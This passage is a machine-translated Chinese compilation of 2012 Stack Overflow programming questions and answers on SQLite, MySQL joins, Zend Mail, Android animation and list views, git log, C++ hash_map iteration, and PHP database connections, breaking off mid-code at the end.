尝试这样的事情

```
var textbox = document.getElementById("mytext");
var textlength = textbox.value.length; 
```

# sqlite - 将 Excel 文件导入 SQLite（使用 SQLite 管理工具）

> ID：12328756
> 
> 赞同：0
> 
> 时间：2012-09-08T07:01:34.367
> 
> 标签：sqlite, import

Excel 文件无法导入 SQLite。如何在没有任何代码的情况下将 Excel 文件导入 SQLite（使用 SQLite 管理工具）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T09:22:50.303

您应该能够导入 CSV 文件，因此请先在 Excel 中将其导出为 .csv。

# mysql - 如何根据列的结果类型从其他 2 个表中获取结果

> ID：12328757
> 
> 赞同：-1
> 
> 时间：2012-09-08T07:01:47.280
> 
> 标签：mysql, database

我有一个名为 users 的表包含

```
(Table A) 
Users
user_id
username
user_type[1,2]

(Table B)     if user_type=1       
user_id
full_name

(Table C)     if user_type=2        
user_id 
full_name 
```

我想通过执行单个查询来获得单个记录集，这在 PHP mysql 中是否可行。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T07:05:46.213

试试这个：

```
SELECT table_a.*, COALESCE(table_b.full_name,table_c.full_name) AS full_name
FROM table_a
LEFT OUTER JOIN table_b ON table_b.user_id = table_a.user_id
LEFT OUTER JOIN table_c ON table_c.user_id = table_a.user_id WHERE 1; 
```

它使用`LEFT OUTER JOIN`，这意味着它`table_b`在给定条件下将其加入。但是，对于 中的每一行`table_a`，无论是否在其中找到匹配的行`table_b`，它都会返回该`table_a`行。如果它没有找到匹配的行，则这些`table_b`列只是 NULL。与`table_c`.

然后，我们只需选择所有`table_a`列。但是，我们现在有两`full_name`列，一列来自`table_b`，一列来自`table_c`。我们`COALESCE`用来合并它们。

`COALESCE`返回第一个非`NULL`值。

既然我们知道在 中要么有匹配的行，`table_b`要么有匹配的行`table_c`，所以这不是问题。`table_b`但是，如果您以某种方式允许在和中找到匹配的行，那将是一个问题`table_c`。

可以通过添加额外的`ON`子句条件来减轻风险，以获得：

```
SELECT table_a.*, COALESCE(table_b.full_name,table_c.full_name) AS full_name
FROM table_a
LEFT OUTER JOIN table_b
             ON table_b.user_id = table_a.user_id AND table_a.user_type = 1
LEFT OUTER JOIN table_c
             ON table_c.user_id = table_a.user_id AND table_a.user_type = 2
WHERE 1; 
```

尽管如此，您仍需要确保 和 中的每个用户仅存在 1`table_b`行`table_c`。

* * *

而不是`COALESCE`你可以选择使用`CASE`像：

```
SELECT table_a.*, CASE user_type WHEN 1
        THEN table_b.full_name
        ELSE table_c.full_name END AS full_name
... 
```

或使用如下`IF`函数： SELECT table_a.*, IF(user_type=1,table_b.full_name,table_c.full_name) AS full_name ...

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-08T07:16:07.677

您可以`UNION`同时使用表和稍后`JOIN`使用`tableA`

```
SELECT  a.User_ID,
        a.`username`,
        b.full_name,
        a.user_type
FROM    tableA a
    (
        SELECT user_ID, full_name
        FROM tableB
        UNION
        SELECT user_ID, full_name
        FROM tableC
    ) b ON a.User_ID = b.User_ID
-- WHERE a.user_type = 1            -- add extra condition here 
```

# php - Zend Mail Imap：获取多部分的正文？

> ID：12328760
> 
> 赞同：2
> 
> 时间：2012-09-08T07:02:21.440
> 
> 标签：php, zend-framework, zend-mail

Zend_Mail_Storage_Imap 和 MultiPart 邮件有一个小“问题”。

> 内容类型：多部分/替代；边界=f46d043bd88a9f5d9004c87d2ad3

第 1 部分有消息的文本，但内容中有标题，所以当我尝试

```
$part->getContent(); 
```

> --f46d043bd88a9f5d9004c87d2ad3 内容类型：文本/纯文本；charset=UTF-8 内容传输编码：quoted-printable
> 
> 你好

是结果，现在如何提取表头信息？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T08:12:42.187

代替：

```
$part->getContent(); 
```

做：

```
$part->getHeader(); 
```

获取标题，或者如果你只想要内容，那么：

尝试：

```
while ($part->isMultipart()) {
    $part = $message->getPart(1);
} 
```

或者

```
$message = $mail->getMessage($messageNum); 
```

对于没有正文的内容。

如果问题仍然存在，请在 Gmail 等邮件客户端上检查您的邮件。有时，我们在发送邮件时（意外地）添加了两次标题信息。

希望这可以帮助 ：）

# editor - 在 Jed 中使用 Mf

> ID：12328762
> 
> 赞同：1
> 
> 时间：2012-09-08T07:02:53.897
> 
> 标签：editor

在 Jed 编辑器中，您应该能够使用 Mf 向右移动一个单词。但是，当我尝试使用 Alt-f 时，它会触发文件菜单。有没有办法使这项工作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-13T03:55:36.190

我没有对此进行测试，但[这个网站](http://neilensperch.withtank.com/blog/2011/02/20/removing-alt-menu-accelerators-in-jed/)似乎有一个解决方案：

```
. . . the solution is to place the following in $HOME/.jedrc

() = evalfile ("emacs"); 
```

# java - View Pager 有自己的想法

> ID：12328765
> 
> 赞同：0
> 
> 时间：2012-09-08T07:03:01.307
> 
> 标签：java, android

我在视图寻呼机中有一组五个平移页面。所有这些页面都有一个列表视图，由于数据太多，我从服务器预取数据并在位置+1本身填充列表，

例如：当页面的位置为 0 时，我会在页面 0 本身期间为适配器加载页面 1 的数据。

问题是，如果我缓慢地平移页面，列表会填充数据并显示精美，如果我进行快速平移，则屏幕会变空，没有列表。

我尝试了 viewpager.getadapter、notifydatasetchanged()、invalidate()、onpagechangelistener()，没有任何效果，我在这个小问题上卡了几个星期，请指导我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T07:21:55.900

[如bitmapFun](http://developer.android.com/training/displaying-bitmaps/index.html)示例所示，如何将结果缓存到 RAM 和外部/内部存储中？

此外，不要在 viewpager 上调用 notifydatasetchanged，而是在片段的 listView 上调用它。我认为它甚至不需要。

无论如何，如果您希望在片段之间滚动时保存片段的状态，请在 onCreate 方法中调用[setRetainInstance(true)](http://developer.android.com/reference/android/app/Fragment.html#setRetainInstance%28boolean%29)，或者使用[onSaveInstanceState](http://developer.android.com/reference/android/app/Fragment.html#onSaveInstanceState%28android.os.Bundle%29)自行保存和恢复状态。

关于慢速加载，让加载同时完成（阅读 asyncTask 的[执行](http://developer.android.com/reference/android/os/AsyncTask.html#execute%28Params...%29)命令），并在离开片段时为 asyncTask 调用取消。您的行为是因为 asyncTasks 是以队列方式添加的，因此您必须停止旧的以使新的运行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-01T08:56:46.303

我为内容提供了加载对话框以在页面之间加载，现在它可以工作了！

# android - 理解 < 和 >

> ID：12328773
> 
> 赞同：8
> 
> 时间：2012-09-08T07:05:02.317
> 
> 标签：android, xml

我在看[这个网站](http://www.androidhive.info/2012/02/android-custom-listview-with-image-and-text/)。我不明白这是什么意思：

```
private ArrayList&lt;HashMap&lt;String, String&gt;&gt; data; 
```

请给我解释一下。

谢谢

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-09-08T07:09:18.380

这些是html实体：

```
&lt; -> <
&gt; -> > 
```

这些字符必须在 html 中转义，因为它们用于开始和结束 html 标记：

```
<p>, <b>, etc. 
```

所以你问的字符串，替换了 html 实体，是：

```
Private ArrayList<HashMap<String, String>> data; 
```

这些 html 实体留在您提到的网站的代码片段中，很可能是错误的，或者是由于该网站如何转义代码片段的错误。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-08T07:13:52.297

那是 HTML 编码中的博客文章错误，

*   `&lt;`= `<`（小于）
*   `&gt;`= `>`（大于）

代码实际上应该看起来像`private ArrayList<HashMap<String, String>> data;`

您应该能够从[这里 (htmlspecialchars_decode) 解码此类 HTML 编码。](http://htmlspecialchars_decode.onlinephpfunctions.com/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-08T07:18:27.460

它是 java 也支持的通用模板。想想如果没有泛型，你怎么能声明这样的事情。

它可能是这样的：

```
HashMap table = new HashMap();

ArrayList arr = new ArrayList();

arr.Add(table); 
```

使用泛型，您可以尽可能简单地编写，而不是使用对象和转换或转换（后期边界）。就像你提到的：

```
private ArrayList<HashMap<String, String>> data; 
```

并且使用声明的变量更容易。

干杯

# android - Android，如何为视图组设置动画监听器？

> ID：12328779
> 
> 赞同：3
> 
> 时间：2012-09-08T07:06:20.167
> 
> 标签：android, animation, listener, viewgroup

我有一个充当菜单的图像视图。当用户单击它时，一个视图组（包括 5 个其他图像视图）将从左向右滑动。当用户再次单击菜单时，从右到左查看组幻灯片。

我可以模拟这种行为，但是在从右向左滑动后，我希望看不到视图组，但是视图组会放在它的位置上。我尝试使用`LinearLayout.setVisibiliy(View.Invisible)`，但在那一刻我看不到从右向左滑动的动画。

这是我的代码，任何建议将不胜感激。

menu_open.xml

```
<layoutAnimation 
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:delay="10%"
    android:animation="@anim/slide_out" /> 
```

幻灯片输出.xml

```
<set xmlns:android="http://schemas.android.com/apk/res/android">

    <translate 
        android:fromXDelta="-100%p" 
        android:toXDelta="0"
        android:duration="@android:integer/config_mediumAnimTime" />

    <alpha 
        android:fromAlpha="0.0" 
        android:toAlpha="1.0"
        android:duration="@android:integer/config_mediumAnimTime" />
</set> 
```

menu_close.xml

```
<layoutAnimation 
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:delay="10%"
    android:animation="@anim/slide_in" /> 
```

幻灯片输入.xml

```
<set xmlns:android="http://schemas.android.com/apk/res/android" >

    <translate 
        android:fromXDelta="0%p" 
        android:toXDelta="-100%p"
        android:duration="@android:integer/config_mediumAnimTime" />

    <alpha 
        android:fromAlpha="1.0" 
        android:toAlpha="0.0"
        android:duration="@android:integer/config_mediumAnimTime" />
</set> 
```

activity_main.xml

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent" >

    <ImageView
        android:id="@+id/ivMenu"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignParentBottom="true"
        android:layout_alignParentLeft="true"
        android:contentDescription="@string/CD"
        android:src="@drawable/ic_menu_01" />

    <LinearLayout
        android:id="@+id/linearLayout"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignParentBottom="true"
        android:layout_toRightOf="@+id/ivMenu" >

        <ImageView
            android:id="@+id/imageView1"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:contentDescription="@string/CD"
            android:src="@drawable/ic_menu_03" />

        <ImageView
            android:id="@+id/imageView2"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:contentDescription="@string/CD"
            android:src="@drawable/ic_menu_04" />

        <ImageView
            android:id="@+id/imageView3"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:contentDescription="@string/CD"
            android:src="@drawable/ic_menu_05" />

        <ImageView
            android:id="@+id/imageView4"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:contentDescription="@string/CD"
            android:src="@drawable/ic_menu_06" />

        <ImageView
            android:id="@+id/imageView5"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:contentDescription="@string/CD"
            android:src="@drawable/ic_menu_07" />
    </LinearLayout>

</RelativeLayout> 
```

MainActivity.java

```
public class MainActivity extends Activity {

    private ImageView ivMenu;
    private Animation animate;
    private LinearLayout groupLayout;
    private boolean menuState = false;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        groupLayout = (LinearLayout) findViewById(R.id.linearLayout);
        groupLayout.setVisibility(View.INVISIBLE);

        ivMenu = (ImageView) findViewById(R.id.ivMenu);
        animate = AnimationUtils.loadAnimation(this, R.anim.animate);
        ivMenu.setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View v) {
                ivMenu.startAnimation(animate);
                runFadeOutAnimationOn(MainActivity.this, ivMenu);

                if(!menuState) {
                     groupLayout.setVisibility(View.VISIBLE);
                     runExpandMenuAnimation(groupLayout, MainActivity.this);
                } else {
                    runCollapseMenuAnimation(groupLayout, MainActivity.this);
//                   groupLayout.setVisibility(View.INVISIBLE);
                }

                menuState = !menuState;
                Log.i("Menu state", "" + menuState);
            }
        });
    }

    public static void runExpandMenuAnimation(ViewGroup panel, Context ctx) {
        LayoutAnimationController controller = AnimationUtils.loadLayoutAnimation(ctx, R.anim.menu_open);
        panel.setLayoutAnimation(controller);
    }

    public static void runCollapseMenuAnimation(ViewGroup panel, Context ctx) {
        LayoutAnimationController controller = AnimationUtils.loadLayoutAnimation(ctx, R.anim.menu_close);
        panel.setLayoutAnimation(controller);
  }

    public static Animation runFadeOutAnimationOn(Activity ctx, View target) {
          Animation animation = AnimationUtils.loadAnimation(ctx, android.R.anim.fade_out);
          target.startAnimation(animation);

          return animation;
    }
} 
```

![在此处输入图像描述](../Images/3b10eb5d693e59231846a3482a5d76f9.png)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-08T09:46:05.193

最后我找到了解决方案。在这种情况下，我们应该使用`aViewGroup.setLayoutAnimationListener(new AnimationListener()...)`并覆盖它的方法。

因此我补充说：

```
 groupLayout.setLayoutAnimationListener(new AnimationListener() {

            @Override
            public void onAnimationStart(Animation animation) {}

            @Override
            public void onAnimationRepeat(Animation animation) {}

            @Override
            public void onAnimationEnd(Animation animation) {
                if(menuState)
                    groupLayout.setVisibility(View.INVISIBLE);

                menuState = !menuState;
                Log.i("Menu state", "" + menuState);
            }
        }); 
```

# sublimetext2 - 崇高的CSS3元素颜色

> ID：12328782
> 
> 赞同：1
> 
> 时间：2012-09-08T07:07:15.617
> 
> 标签：sublimetext2

我已经使用 sublime 大约半年和一年了，现在我想对其进行一些修改。我安装了一些软件包和其他东西，但我遇到了一些问题。

使用主题 Monokai（以及其他经过测试的主题），我无法为“-webkit-box-shadow”等属性和其他 css3 元素赋予正确的颜色。我的意思是，我也想为供应商前缀和新的 css3 元素设置正确的颜色。

![在此处输入图像描述](../Images/5146be86d18a68a736a1dec64919b612.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T17:01:31.373

我找到了一个可以解决我的问题的插件[https://github.com/i-akhmadullin/Sublime-CSS](https://github.com/i-akhmadullin/Sublime-CSS)。关闭！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-02T18:23:19.010

将此`<dict>`条目添加到您的`.tmTheme`文件中，以便为所有（也是未知的）css 属性名称提供正确的颜色：

```
 <dict>
        <key>name</key>
        <string>CSS property name</string>
        <key>scope</key>
        <string>meta.property-name.css</string>
        <key>settings</key>
        <dict>
            <key>fontStyle</key>
            <string>italic</string>
            <key>foreground</key>
            <string>#66D9EF</string>
        </dict>
    </dict> 
```

# ruby-on-rails-3 - 如何获取输入/自动完成文本以引用 Rails 中的外国 id？

> ID：12328783
> 
> 赞同：0
> 
> 时间：2012-09-08T07:07:40.370
> 
> 标签：ruby-on-rails-3, forms, twitter-bootstrap

所以我一直在努力让这个 Twitter Bootstrap typeahead 工作，现在当我开始将它输入到表单中时，我可以获得所有数据的列表，但是当我提交时，这些值不会作为 ID 传入。有什么方法可以让我根据自动完成选择传递一个 ID 号？

这是我正在使用的代码...

```
 <%= f.text_field :cargo_to_load_id, :data => { provide: "typeahead", source: Cargo.order(:name).map(&:name) , items: "9" } %> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-16T21:40:36.083

事实证明，我需要在我的模型文件中包含这些 getter 和 setter 方法。然后这些将完成查找相应 id 的工作。

```
 def cargo_to_unload_name
    cargo_to_unload(:name)
  end

  def cargo_to_unload_name=(name)
    self.cargo_to_unload = Cargo.find_by_name(name)
  end

  def cargo_to_load_name
    cargo_to_load(:name)
  end

  def cargo_to_load_name=(name)
    self.cargo_to_load = Cargo.find_by_name(name)
  end 
```

# php - 更改端口号的php数据库连接错误

> ID：12328785
> 
> 赞同：0
> 
> 时间：2012-09-08T07:08:14.920
> 
> 标签：php, database-connection

我在尝试通过 wamp 服务器连接 .php 文件时遇到数据库连接问题，
错误消息类似于 - 数据库“aschool”的“用户访问被拒绝”@“localhost”
。“aschool”是我的数据库名称。
提到我已经更改了 wamp 服务器的端口号，我担心这真的是为了更改端口号或其他任何东西。这是我的代码。

```
$con = mysql_connect();
if (!$con)
{
die('Could not connect: ' . mysql_error());
}
mysql_select_db("aschool", $con); 
```

在此行之后，出现错误消息。我在 mysql_connect()
函数或更多参数中尝试了参数“localhost”，但结果是相同的。
提前感谢任何人给我任何解决方案

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T07:13:32.677

那是因为您在`mysql_connect`用例中使用了错误的方法。

如果您[查看文档页面](http://php.net/manual/en/function.mysql-connect.php)，它会说您也可以使用服务器路径，例如`mysql_connect('localhost:1234', 'username', 'password')`.

**但你不应该使用`mysql_connect`.**

[使用 PDO](http://php.net/manual/en/pdo.construct.php)以便您可以使用参数化查询。

在代码中它会是这样的：

```
try
{
  $pdo = new \PDO('mysql:dbname=aschool;host=127.0.0.1', 'myUser', 'myPassword');
} catch (PDOException $exception)
{
  // Do something with your exception.
  // Echo it, dump it, log it, die it.
  // Just don't ignore the exceptions!
} 
```

# git - 即使日志文件存在，为什么“git log”为空？

> ID：12328791
> 
> 赞同：5
> 
> 时间：2012-09-08T07:09:19.803
> 
> 标签：git

`git log`即使“ `.git/logs/refs/heads`”确实包含最近提交的日志条目，也不会产生任何内容。

系统：
我在我的 ubuntu 安装中卸载并重新安装了 git。

```
Linux ap 3.0.0-17-generic #30-Ubuntu SMP Thu Mar 8 20:45:39 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-29T11:07:07.097

我得到了同样的错误。问题是我在我的错误位置定义了一个默认寻呼机`.bashrc`：

```
export PAGER=/usr/bin/more 
```

运行`git log`没有返回任何输出。我将位置更改为`/bin/more`并修复了。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-08T08:07:55.047

`git log`与“.git/logs/”无关。`git log`读取“.git/refs/”

`git reflog`读取“.git/logs/”，用于记录分支的尖端何时更新。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-04-17T09:31:09.223

正如 Diego Pino 所说，问题可能与 git core.pager 设置有关。

我写这个是因为我有同样的问题，但情况不同。按照提示在设置部分设置空值后，`git core.pager`我失去了使用 的可能性`git log`，我的意思是命令的输出为空。此设置的目的是不使用任何寻呼机，只是将所有内容打印到标准输出，但出现了问题。它是这样的`.gitconfig`：

```
[core]
    pager = " " 
```

解决方案可能是`core.pager`在`.gitconfig`全局（在用户的主文件夹`.gitconfig`文件中）或在整个系统的上下文中（在 /etc/gitconfig 中）分别设置一个设置：

```
git config --global core.pager more 
```

或者

```
sudo git config --system core.pager more 
```

我更喜欢`more`作为长输出的寻呼机，但我的 git 安装中的默认寻呼机是`less`- 选择与您相关的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-08T08:07:45.210

尝试再次克隆您的存储库并查看错误是否仍然存在。

确保你没有定义环境变量，`GIT_DIR`否则`GIT_WORK_TREE`git log 不会在你认为的 git repo 上运行。

确保没有 ' ' 的别名`git`，或者（就此而言）没有' ' 的*git*别名`log`。

# c++ - 嵌套的 stdext::hash_map 迭代

> ID：12328799
> 
> 赞同：0
> 
> 时间：2012-09-08T07:10:53.673
> 
> 标签：c++, unordered-map

我有一个关于 UNORDERED_MAP 的问题

我使用这两种类型定义：

```
typedef UNORDERED_MAP<uint32, WorldSession*> SessionCharMap;
typedef UNORDERED_MAP<uint32, SessionCharMap > SessionMap; 
```

使用以下定义：

```
#  define UNORDERED_MAP stdext::hash_map 
```

所以基本上这是 1 个容器，其中包含许多其他类型的 SessionMap -*> SessionCharMap 的容器。

在以下 m_sessions 中使用：

```
SessionMap m_sessions; 
```

它用于分配一个 Sessionid 几个 subid 以不同地处理它们。如果 SessionCharMap 的 uint32 == NULL 帐户尚未完全登录，必须选择一个字符。这工作正常，直到我想将登录的会话取消分配给未完全登录的会话：

```
bool DeassignCharFromSession(uint32 acc, uint32 chr){

SessionMap::iterator itr2;
for (itr2 = m_sessions.begin(); itr2 != m_sessions.end(); itr2++){       
    if(itr2->first == acc){
        for (SessionCharMap::iterator itr = itr2->second.begin(); itr != itr2->second.end(); itr++){
            if( itr->first == chr &&
                itr->second){
                WorldSession* ses = itr->second;                                                                                                    
                itr2->second.erase(itr);
                m_sessions[acc][NULL] = ses;
                sLog.outDebug("############################################1 %d %d",itr2->first,itr->first);

                return true;
            }
        }
    }
}

return false;
} 
```

此代码接缝破坏了我的 m_sessions 变量，因为在它上面运行以更新 Sessions 的迭代循环不再终止。我想提一下，我已经尝试过“itr2->second[NULL] = ses;”

```
void UpdateSessions( uint32 diff )
int i = 0;
for (SessionMap::iterator itr2 = m_sessions.begin(); itr2 != m_sessions.end(); ++itr2){      
    int j = 0;
    for(SessionCharMap::iterator itr = itr2->second.begin(); itr != itr2->second.end(); ++itr){
        //WorldSession * pSession = itr->second;
        debug_log("########################### 123 %d %d %d %d %d",itr2->first,itr->first, itr->second ? 1 : 0, i,j);
        j++;
        WorldSessionFilter updater(itr->second);

        if(!itr->second){
            debug_log("########################### 1231 %d %d",itr2->first,itr->first);
            //itr2->second.erase(itr);
        } else
        if(!itr->second->Update(updater))
        {
            debug_log("########################### 1233");
            RemoveQueuedSession(itr->second);                               
            debug_log("########################### 1234");
            itr2->second.erase(itr);
            debug_log("########################### 1235");
            delete itr->second;             
            debug_log("########################### 1236");
        }           
    }
    i++;
}
} 
```

在 Debugoutput 之后，我得到：

```
 2012-09-08 08:33:13 ############################################1 1 1
 012-09-08 08:33:13 ########################### 123 1 0 0 0 1
 2012-09-08 08:33:13 ########################### 1231 1 0
 2012-09-08 08:33:13 ########################### 123 1 0 0 0 2
 2012-09-08 08:33:13 ########################### 1231 1 0
 2012-09-08 08:33:13 ########################### 123 1 0 0 0 3
 2012-09-08 08:33:13 ########################### 1231 1 0
 2012-09-08 08:33:13 ########################### 123 1 0 0 0 4
 2012-09-08 08:33:13 ########################### 1231 1 0
 2012-09-08 08:33:13 ########################### 123 1 0 0 0 5
 2012-09-08 08:33:13 ########################### 1231 1 0
 2012-09-08 08:33:13 ########################### 123 1 0 0 0 6
 2012-09-08 08:33:13 ########################### 1231 1 0
 2012-09-08 08:33:13 ########################### 123 1 0 0 0 7
 2012-09-08 08:33:13 ########################### 1231 1 0
 2012-09-08 08:33:13 ########################### 123 1 0 0 0 8
 2012-09-08 08:33:13 ########################### 1231 1 0
 2012-09-08 08:33:13 ########################### 123 1 0 0 0 9
 2012-09-08 08:33:13 ########################### 1231 1 0
 2012-09-08 08:33:13 ########################### 123 1 0 0 0 10
 2012-09-08 08:33:13 ########################### 1231 1 0
 2012-09-08 08:33:13 ########################### 123 1 0 0 0 11
 2012-09-08 08:33:13 ########################### 1231 1 0
 2012-09-08 08:33:13 ########################### 123 1 0 0 0 12
 2012-09-08 08:33:13 ########################### 1231 1 0
 2012-09-08 08:33:13 ########################### 123 1 0 0 0 13
 2012-09-08 08:33:13 ########################### 1231 1 0
 2012-09-08 08:33:13 ########################### 123 1 0 0 0 14
 2012-09-08 08:33:13 ########################### 1231 1 0
 2012-09-08 08:33:13 ########################### 123 1 0 0 0 15
 2012-09-08 08:33:13 ########################### 1231 1 0
 2012-09-08 08:33:13 ########################### 123 1 0 0 0 16
 2012-09-08 08:33:13 ########################### 1231 1 0
 2012-09-08 08:33:13 ########################### 123 1 0 0 0 17 
```

i 和 j 计数器仅用于调试输出。您可以看到内部容器的 j 计数器上升。但我只有 1 个在线会话。如果我想注销它会导致 j 上升到 ~400 读取随机内存;-)。

我不明白为什么for循环

```
for (SessionCharMap::iterator itr = itr2->second.begin(); itr != itr2->second.end(); itr++){...} 
```

跑过它的边界。如果您发现我没有想法的错误，请告诉我。

还有一件事：UpdateSession 例程在正确登录时工作正常（每个 for 循环只有一次迭代）。注销时首先出现错误。然后迭代器发疯了。我的猜测是，我在 DeassignCharFromSession 中错误处理了容器。

在你们的帮助下更新：

更正了 UpdateSession

```
void UpdateSessions( uint32 diff ){
int i = 0;
for (SessionMap::iterator itr2 = m_sessions.begin(); itr2 != m_sessions.end(); ++itr2){      
    int j = 0;
    for(SessionCharMap::iterator itr = itr2->second.begin(); itr != itr2->second.end();){
        //WorldSession * pSession = itr->second;
        debug_log("########################### 123 %d %d %d %d %d",itr2->first,itr->first, itr->second ? 1 : 0, i,j);
        j++;
        WorldSessionFilter updater(itr->second);

        debug_log("########################### 123 %d %d %d",itr2->first,itr->first, itr->second ? 1 : 0);
        if(!itr->second){
            //this case should never occur!
            debug_log("########################### 1231 %d %d",itr2->first,itr->first);
            ++itr;
            //itr2->second.erase(itr);
        }else

        if(!itr->second->Update(updater))
        {
            debug_log("########################### 1233");
            RemoveQueuedSession(itr->second);                               
            debug_log("########################### 1234");
            delete itr->second;
            debug_log("########################### 1235");
            itr2->second.erase(itr++);
            debug_log("########################### 1236");
        } else {
            ++itr;
        }
    }
    i++;
}           
} 
```

更正了 DeassignCharFromSession：

```
bool DeassignCharFromSession(uint32 acc, uint32 chr){
if(m_sessions[acc][chr]){
    sLog.outDebug("############################################1 %d %d",acc,chr);
    m_sessions[acc][NULL] = m_sessions[acc][chr];
    m_sessions[acc].erase(chr);
    sLog.outDebug("############################################2");
    return true;
}

debug_log("################################### UUU2");
return false;
} 
```

但问题仍然存在：UpdateSessions 中的循环不断迭代 unordered_map。它发生了 348 次，然后以 Accessviolation 结束。我仍然很困惑为什么

if(!itr->second){..}

触发器。因为 unordered_map 中应该只有一个有效会话。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T07:33:46.450

当您使用擦除时，您*会使迭代器无效*。所以当你写

```
itr2->second.erase(itr); 
```

`UpdateSessions`你不能再使用它，`itr`因为它不再指向你的哈希映射的成员。所以下一行`delete itr->second;`和关键的循环迭代`++itr`都是错误的。第一个问题很容易解决，只需切换删除和擦除的顺序

```
delete itr->second;
itr2->second.erase(itr); 
```

第二个问题有点棘手，基本上你必须像这样重写你的循环

```
for (SessionCharMap::iterator itr = itr2->second.begin(); itr != itr2->second.end(); )
{
    ...
    if (itr->second->Update(updater))
    {
        ++itr;
    }
    else
    {
        ...
        delete itr->second;
        itr2->second.erase(itr++);
    }
} 
```

这样，您在调用擦除*之前*递增迭代器，但因为您使用后递增运算符擦除仍然获得迭代器的先前值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-11T23:32:41.167

解决了问题。由于 DeassignCharFromSession 中的删除，UpdateSessions 中的迭代器（见下文）变得无效。休息一下就解决了。这将导致某些会话等待 2 个周期进行更新。

```
///- Then send an update signal to remaining ones   
debug_log("############################## OOOOO LOL");
int i = 0;
for (SessionMap::iterator itr2 = m_sessions.begin(); itr2 != m_sessions.end(); ++itr2){      
    int j = 0;
    SessionCharMap::iterator itr;
    for(itr = itr2->second.begin(); itr != itr2->second.end();){
        //WorldSession * pSession = itr->second;
        debug_log("########################### 123 %d %d %d %d %d",itr2->first,itr->first, itr->second ? 1 : 0, i,j);
        j++;
        WorldSessionFilter updater(itr->second);

        debug_log("########################### 123 %d %d %d",itr2->first,itr->first, itr->second ? 1 : 0);
        if(!itr->second){
            //this case should never occur! but it does cuz iterator becomes invalid cuz of delete
            debug_log("########################### 1231 %d %d",itr2->first,itr->first);
            ++itr;
            break;
            //itr2->second.erase(itr);
        }else

        if(!itr->second->Update(updater))
        {
            debug_log("########################### 1233");
            RemoveQueuedSession(itr->second);                               
            debug_log("########################### 1234");
            delete itr->second;
            debug_log("########################### 1235");
            itr2->second.erase(itr++);
            debug_log("########################### 1236");
        } else {
            ++itr;
        }
    }
    i++;
} 
```

# qt - Qt后台任务触摸事件

> ID：12328803
> 
> 赞同：1
> 
> 时间：2012-09-08T07:11:38.360
> 
> 标签：qt, background, symbian, textinput, touch-event

我有一个 Symbian Qt“背景”应用程序，它使用从 CActive 派生的 CWindowDrawer 显示按钮类型的东西，它在所有东西上都是可见的。我希望它在文本输入处于活动状态或虚拟键盘可见时可见，最好是在文本输入处于活动状态时，因为某些手机具有硬件键盘。当它可见时，我希望它接收所有触摸位置，以确定它是否在没有聚焦并关闭键盘的情况下被按下？

基本上，我需要一种方法来确定何时激活文本输入，并且我需要一种方法来监听来自非焦点的非 qwidget 的所有触摸位置。

任何帮助，将不胜感激。

PS。这适用于 Symbian Belle，如果需要，Qt 应用程序也支持 Symbian C++。

# android - Listview setOnItemClickListener - 不适用于自定义列表视图，但适用于简单列表视图

> ID：12328804
> 
> 赞同：2
> 
> 时间：2012-09-08T07:11:41.793
> 
> 标签：android, listview, listviewitem

我在获取`listview item`单击列表项时遇到问题。我得到`listview item`了`simple listview`（Arrayadapter），但我遇到了`custom listview`.

我在用

```
listview.setOnItemClickListener(new OnItemClickListener() {

            @Override
            public void onItemClick(AdapterView<?> myAdapter, View myView, int pos, long mylng) {

  //String  selectedFromList = (String) listview.getItemAtPosition(pos);
   String  selectedFromList = (String) adapter.getItem(pos);

    System.out.println("selected value >> >> >> >> >> >>"+selectedFromList);

    SelectedAnswer.setAnswer(selectedFromList);

              }

          }); 
```

进入 Logcat 给我`null`价值：

```
I/System.out( 1238): selected value >> >> >> >> >> >>null 
```

主类

```
 protected void onCreate(Bundle savedInstanceState) {
    // TODO Auto-generated method stub
    super.onCreate(savedInstanceState);
    setContentView(R.layout.quiz_questions);

        listview = (ListView) findViewById(R.id.questions_list);

        GoToNextQuestion();
  }

private void GoToNextQuestion() {
    // TODO Auto-generated method stub

     currentGame = ((Quizapplication)getApplication()).getCurrentGame();
    currentQ = currentGame.getNextQuestion();

       setQuestions();

    listview.setOnItemClickListener(new OnItemClickListener() {

            @Override
            public void onItemClick(AdapterView<?> myAdapter, View myView, int pos, long mylng) {

  //String  selectedFromList = (String) listview.getItemAtPosition(pos);
